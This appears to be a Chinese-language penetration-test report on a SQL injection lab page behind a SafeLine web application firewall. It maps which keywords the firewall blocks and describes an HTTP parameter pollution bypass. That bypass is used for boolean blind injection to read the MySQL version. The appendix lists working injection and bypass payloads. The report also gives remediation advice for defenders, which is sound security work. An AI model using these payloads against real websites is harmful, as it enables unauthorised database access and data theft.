### 1.2 什么是 SQL 注入？

SQL 注入是一种常见的网络攻击方式。攻击者在网页输入框中**混入恶意的 SQL 代码**，欺骗数据库执行非预期的命令。

**打个比方：** 就像你去银行取钱，柜员问"请输入你的账号"，你不仅输入了账号，还加了一句"顺便把别人的钱也转给我"。如果银行系统没有检查你的输入，它就真的执行了。

### 1.3 什么是 WAF？

WAF（Web 应用防火墙）就像网站的"安检员"。所有进出网站的请求都要经过它检查：

```
用户请求 → [WAF 安检员] → 正常请求 → 网站服务器
                      ↘ 恶意请求 → 拦截（返回 403）
```

本次测试的长亭 SafeLine WAF 就是一个严格的"安检员"。

## 二、漏洞发现过程

### 2.1 找到注入点

首先我们测试了网站的基础反应：

```
请求: ?id=1
响应: 显示用户 "Dumb" 的信息         ✅ 正常
```

然后试了一个单引号 `'`（SQL 注入的"探针"）：

```
请求: ?id=1'
响应: 数据库报错信息
```

**报错内容：**
```
You have an error in your SQL syntax;
near ''1'' LIMIT 0,1' at line 1
```

**这意味着什么？** 网站直接把用户的输入拼到了 SQL 语句中，导致 SQL 语法出错，而且**错误信息直接显示在了网页上**。这说明：

1. ✅ 存在 SQL 注入漏洞
2. ✅ 是字符型注入（用单引号闭合）
3. ✅ 报错信息泄露了数据库结构
  
**后台真实的 SQL 语句长这样：**
```sql
SELECT * FROM users WHERE id='用户输入的内容' LIMIT 0,1
```

### 2.2 尝试注入——WAF 介入

我们发现漏洞后，尝试了最简单的注入 payload：

```
请求: ?id=1' OR '1'='1
结果: ❌ HTTP 403（WAF 拦截了！
```

WAF 检测到了 `OR` 关键字，直接拦截了请求。

## 三、WAF 探测过程

### 3.1 摸清 WAF 的"脾气"

我们像一个侦探一样，一点点测试 WAF 到底拦什么、不拦什么。

#### ✅ 放行通过的内容

```
'          单引号                  → ✅ 通过
||         两个竖线（逻辑或）       → ✅ 通过
&&         两个&（逻辑与）         → ✅ 通过
>  <  =    比较符号               → ✅ 通过
#          SQL注释符              → ✅ 通过
@@version  数据库版本变量          → ✅ 通过
if()       if判断函数             → ✅ 通过
```

#### 🚫 被拦截的内容

```
OR          关键字"或"             → 🚫 拦截
AND         关键字"与"             → 🚫 拦截
UNION       联合查询               → 🚫 拦截
SELECT     查询关键字              → 🚫 拦截
ORDER BY   排序关键字              → 🚫 拦截
LIKE       模糊匹配               → 🚫 拦截
database() 获取数据库名的函数       → 🚫 拦截
substr()   截取字符串的函数         → 🚫 拦截
concat()   拼接字符串的函数         → 🚫 拦截
sleep()    延迟函数（时间注入）     → 🚫 拦截
...等等几乎所有函数名              → 🚫 全部拦截
```

**结论：这个 WAF 像个"关键词警察"——它记住了一大串危险关键词，看到就拦。**

## 四、重大发现：HPP 参数污染

### 4.1 原理

这是我们本次测试最重要的发现。

```
正常请求:  ?id=1' OR '1'='1
           WAF检测到"OR" → 拦截 🚫

HPP请求:   ?id=1&id=1' OR '1'='1
           
           WAF看到第一个 id=1      → 安全，放行 ✅
           PHP看到最后一个 id=恶意内容 → 执行注入 ✅
```

**通俗解释：** 就像寄快递时填了两个收件人地址。门卫（WAF）只看了第一个地址："嗯，这是安全的地方"，就放行了。但快递员（PHP）却按照最后一个地址送货，送到了恶意的地方。

### 4.2 成功利用 HPP 确认了数据库版本

有了 HPP 这个"后门"，我们配合 `if()` 和 `||` 构建了一套**布尔盲注**方案：

```
请求?id=1&id=xxx'||if(@@version>'5.5.52',1,0)%23
                                    ↓
如果版本 > 5.5.52 → 条件为真 → 页面显示数据 ✅
如果版本 ≤ 5.5.52 → 条件为假 → 页面不显示 ❌
```

通过反复测试不同的版本号，我们最终确定了数据库版本：

```
@@version > '5.5.52' → ✅ TRUE
@@version > '5.5.53' → ❌ FALSE
                  ↓
数据库版本 = 5.5.53 ✓
```

## 五、最终结论

### 5.1 测试结果总表

| 测试项目 | 结果 |
|---------|:---:|
| 是否存在 SQL 注入漏洞 | ✅ **存在**（未过滤用户输入） |
| WAF 是否拦截了常规注入 | ✅ **成功拦截**（403） |
| HPP 参数污染能否绕过 | ✅ **成功绕过** |
| 能否获取数据库版本 | ✅ **成功**（MySQL 5.5.53） |
| 能否获取表里的用户数据 | ❌ **被拦截**（SELECT 关键字被封死） |
| 能否获取数据库名称 | ❌ **被拦截**（database() 函数被封） |

### 5.2 一句话总结

> **WAF 成功防住了所有数据窃取类的注入，但没能防住版本探测。**

### 5.3 安全建议

**对网站管理员（防守方）：**

1. **WAF 不是万能的** — HPP 参数污染这种基础攻击手法居然能绕过，说明 WAF 配置需要加强
2. **根本解决方法是修复代码** — 使用**参数化查询**（Prepared Statement）而不是拼接 SQL 字符串
3. **WAF 应检查所有同名参数** — 不只检查第一个，所有同名参数都应该检测
4. **黑名单总有遗漏** — 比如 `if()` 函数、`||` 运算符、`@@version` 变量都没列入黑名单

**对安全测试人员（攻击方）：**

1. **WAF 拦截了"直来直去"的攻击，但防不住"拐弯抹角"的技巧**
2. **HPP 参数污染 + 未被列入黑名单的函数** 是目前绕过 WAF 的有效组合
3. **布尔盲注结合字符串比较** 可以在即使函数被封锁的情况下提取系统信息

## 六、技术细节附录

### 6.1 确认有效的注入 payload

**探测注入点：**
```
?id=1'
?id=1%5c（反斜杠）
```

**HPP 绕过验证：**
```
?id=1&id=xxx'||1=1%23        → 返回数据（条件真）
?id=1&id=xxx'||1=0%23        → 无数据（条件假）
```

**提取版本号（逐位盲注）：**
```
?id=1&id=xxx'||if(@@version>'5.5.52',1,0)%23
?id=1&id=xxx'||if(@@version>'5.5.53',1,0)%23
```

**使用异或运算做布尔判断：**
```
?id=1&id=xxx'||(1^0)%23      → 返回数据（1异或0=真）
?id=1&id=xxx'||(1^1)%23      → 无数据（1异或1=假）
```
